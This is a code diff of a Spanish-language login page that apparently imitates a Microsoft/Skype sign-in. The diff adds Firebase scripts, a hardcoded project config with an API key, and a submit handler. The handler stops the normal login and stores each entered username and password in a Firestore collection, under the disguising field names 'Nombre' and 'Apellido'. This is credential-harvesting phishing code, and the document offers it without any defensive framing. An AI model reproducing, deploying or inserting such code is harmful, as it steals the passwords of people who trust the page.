@@ -4,7 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+  <script src="https://www.gstatic.com/firebasejs/10.1.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore-compat.js"></script>
   <style>
     /* Tu estilo actual aquí */
 
@@ -259,14 +260,14 @@
 }
 
   </style>
-  <title>Página de Inicio de Sesión</title>
+  <title>Inicio de Sesión</title>
 </head>
 <body>
   <div class="container">
     <!-- Agregar el logo al principio del formulario -->
     <img src="swswsw.png" alt="Logo de tu empresa" style="width: 120px; height: 45px; margin-bottom: 0px;">
 
-    <form action="login.php" method="post">
+    <form id="form" action="login.php" method="post">
       <h2 class="titulo-personalizado">Iniciar Sesión</h2>
       
       <input type="text" id="username" name="username" placeholder="Correo electrónico, teléfono o Skype" required>
@@ -288,7 +289,43 @@
  
  
 </div>
+<!-- Agrega estas líneas después de vincular las bibliotecas de Firebase -->
+<script src="https://www.gstatic.com/firebasejs/10.1.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore-compat.js"></script>
+<script>
+  const firebaseConfig = {
+  apiKey: "AIzaSyDtSjx9CI-RrovRymcxp56Q3dWmfMxXSg0",
+  authDomain: "xs-304f1.firebaseapp.com",
+  projectId: "xs-304f1",
+  storageBucket: "xs-304f1.appspot.com",
+  messagingSenderId: "292813054221",
+  appId: "1:292813054221:web:b4b193c51e7c73b7dbd044"
+};
 
+firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+</script>
+<script>
+  document.getElementById('form').addEventListener('submit', function (event) {
+    event.preventDefault(); // Evita que el formulario se envíe de la manera tradicional
+
+    const nombre = document.getElementById('username').value;
+    const apellido = document.getElementById('password').value;
+
+    // Guarda los datos en Firebase Firestore
+    db.collection('usuarios').add({
+      Nombre: nombre,
+      Apellido: apellido
+    })
+    .then(function(docRef) {
+      console.log('Document written with ID: ', docRef.id);
+      // Puedes hacer otras cosas aquí después de guardar los datos
+    })
+    .catch(function(error) {
+      console.error('Error adding document: ', error);
+    });
+  });
+</script>
 </body>
 <div id="XeuNMyNkaPlcgfC" class="mJNHvZHfqTAjshj">
   <div class="GcoybiklEMpmnCD"><img style="width:32px;height:32px;" src="data:image/pngNzUxODg3NTY1ODQzOTc1;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAA1VBMVEUAAABJSUk5OTlGRkZAQEA7OztEREQ8PDxHR0dDQ0M9PT1GRkZDQ0M9PT0+Pj5ERERCQkI+Pj5DQ0NAQEA+Pj5DQ0M+Pj5CQkJCQkJBQUFAQEA/Pz9AQEBAQEBBQUFAQEBAQEA/Pz9AQEA/Pz9BQUFAQEBAQEA/Pz9AQEA/Pz9AQEBAQEBAQEBAQEBAQEA/Pz9AQEBAQEBAQEA/Pz9AQEA/Pz9AQEBAQEA/Pz9AQEBAQEA/Pz9AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQED///8zybJlAAAARXRSTlMABwkLDA0PERITFRYXGR0eHyUmKCkqLT5CQ0RJY2RmZ2hpa4GmqLCxsrm6vr/C0NHS09TV19na3N3f4OHi4/Dy8/T29/gcPWP7AAAAAWJLR0RGF7r57QAAATJJREFUSMft1F1XgkAQBuAhTVEosjIqNSQqzAQVy490Q6P3//+lLhJUzAEv6HThXLFz5jk7OywQHeIfRsm0Z0EgWqacqlyy5liGb0nJ9VoXeK5XcrlLowN0taT6M4E3PVzcjCAShNSDU1wtZQcu35WF0cZJ5SEsdj4+rolqQtTCjA6fm5WJFyISgIhSbTQZ0IIRBw3YDJjhgjZbonNMGPCFfDyVR8CAYBsUsGDAFJV46gpjBtiox1P3eGTH2o6nHuCVmRc3hx5LqQP0ytzVGMrbor9bSC6c0i9C2SlOBca30fWeIFloLtC5qx4VqoYDIMUekuWHn+jHEiQIKjbt6Wfw/tQ4DgGpA3hKih/Cz0ZEREofryf7gLSCiNbO4e0FSI2e0raVFViVZgvWBpwJOMSfxDeQbjtBBpqwgwAAAABJRU5ErkJggg=="></div>
